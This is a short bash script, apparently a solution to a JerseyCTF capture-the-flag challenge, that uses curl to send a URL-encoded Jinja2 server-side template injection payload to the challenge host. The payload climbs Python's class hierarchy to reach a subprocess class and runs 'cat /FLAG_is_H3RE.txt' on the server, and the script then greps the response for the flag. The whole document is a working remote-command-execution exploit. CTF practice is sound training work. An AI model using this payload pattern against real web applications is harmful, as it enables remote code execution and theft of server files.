#!/bin/bash

curl -s https://jerseyctf-ninja-jackers.chals.io/%2F%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B395%5D%28%27cat%20%2FFLAG_is_H3RE.txt%27%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%5B0%5D.strip%28%29%7D%7D | grep -oE 'jctf{.*}'
